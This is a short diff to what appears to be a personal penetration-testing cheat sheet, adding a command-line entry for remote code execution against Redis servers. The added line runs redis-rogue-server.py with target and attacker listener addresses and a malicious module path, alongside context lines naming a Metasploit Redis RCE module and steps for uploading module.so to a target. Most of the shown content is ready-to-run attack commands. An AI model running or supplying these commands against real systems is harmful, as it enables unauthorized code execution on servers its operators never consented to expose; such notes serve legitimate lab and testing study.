@@ -900,6 +900,9 @@ sudo python3 redis-master.py -r 192.168.89.69 -L 192.168.49.89 -P 80 -f RedisMod
 Vulnerable versions to RCE: 4.x/5.x
 Metasploit: linux/redis/redis_rce
 
+Remote Code Execution: Requires Less than 5.5.9
+	./redis-rogue-server.py --rhost=192.168.210.176 --rport=6379 --lhost=192.168.45.237 --lport=4555 --exp=../Documents/exploits/redis/RedisModules/module.s
+
 Command Injection Modules
 	1) Locate module.so file in /home/kali/Documents/exploits
 	2) Upload it somehow to the target. FTP or HTTP will be the most common methods
